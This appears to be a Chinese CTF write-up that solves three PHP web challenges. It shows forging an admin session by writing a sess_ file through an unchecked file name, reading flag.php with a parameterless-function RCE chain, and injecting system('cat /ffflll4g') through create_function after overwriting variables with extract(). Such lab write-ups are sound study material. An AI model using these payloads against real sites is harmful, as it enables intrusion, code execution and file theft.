web3-考核

<?php
highlight_file(__FILE__);
$content = @$_GET['content'] ? "---mylocalnote---\n" . $_GET['content'] : "";
$name = @$_GET['name'] ? $_GET['name'] : '';
str_replace('/', '', $name);
str_replace('\\', '', $name);
file_put_contents("/tmp/" . $name, $content);
session_start();
if (isset($_SESSION['username'])) {
    echo "Thank u,{$_SESSION['username']}";
}
//flag in flag.php

代码审计，将$content写入/tmp/$name中，不允许跳转目录

访问flag.php，可以看到

u are not admin,only admin can see flag!

所以需要有一个键名为username，键值为admin的session，才能拿到flag

而php session是以文件的方式存储在/tmp目录下，文件名为sess_xxxxxxxxx，而我们可以通过$name写入相应的session

其中一种存储格式为

键名 + 竖线 + 经过serialize()函数序列化处理的值
<?php
class A {
	public $a = "admin";
}
$test = new A();
echo serialize($test);
// O:1:"A":1:{s:1:"a";s:5:"admin";}

所以$content应为username|s:5:"admin";

但$content前面写入了---mylocalnote---\n，我们可以加个竖线，将前面的内容当做键名

?content=|s:5:"admin";username|s:5:"admin";

f12查看PHPSESSID，所以name为

?name=sess_7bkjc3a2d4uu0kmquitva3mke6

访问：

?content=|s:5:"admin";username|s:5:"admin";&name=sess_7bkjc3a2d4uu0kmquitva3mke6

再访问/flag.php，即可拿到flag

无参数RCE，过滤了一些协议和部分函数，且只允许传进小写字母、逗号、下划线构成的无参数函数

用pos()取localeconv()返回的数组的第一个元素，也就是”.”，所以可以用来读取当前文件目录

?exp=var_dump(scandir(pos(localeconv())));

得到：

array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(5) "1.php" [4]=> string(8) "flag.php" [5]=> string(9) "index.php" }

flag.php在倒数第二个文件，先用array_reverse()反转数组，再用next()指向下一个元素，最后通过show_source()读取

?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));

easy-web-考核

<?php
show_source(__FILE__);
$key = "bad";
extract($_POST);
if($key === 'bad'){
    die('badbad!!!');
}
$act = @$_GET['act'];
$arg = @$_GET['arg'];
if(preg_match('/^[a-z0-9_]*$/isD',$act)) {
    echo 'check';
} else {
    $act($arg,'');
}

echo '666';
badbad!!!

extract()函数可以将数组的键名作为变量名，相应的键值作为变量值

所以可以通过变量覆盖，让key不为bad

而正则表达式的意思是：如果$act不能以字母、数学和下划线开头，结尾不允许有换行，且不能有不可见字符

看到$act($arg,'');，想到了create_function()

create_function(string $args,string $code)
//string $args 声明的函数变量部分
//string $code 执行的方法代码部分

所以我们可以用\来绕过这个正则

<?php
$fun = create_function('$a', 'echo $a;');
echo $fun(2);
// 输出：2

相当于

function fun($a) {
	echo $a;
}

所以可以用){}来闭合函数，然后用/*来注释掉后面的代码，中间部分可以用来执行我们想要的代码

?act=\create_function&arg=){}phpinfo();/*

在根目录下发现一个文件：ffflll4g

?act=\create_function&arg=){}system('ls /');/*
app bin boot create_mysql_admin_user.sh dev etc ffflll4g home lib lib64 media mnt opt proc root run run.sh sbin srv start-apache2.sh start-mysqld.sh sys tmp usr var 666

读取ffflll4g，即可拿到flag

?act=\create_function&arg=){}system('cat /ffflll4g');/*
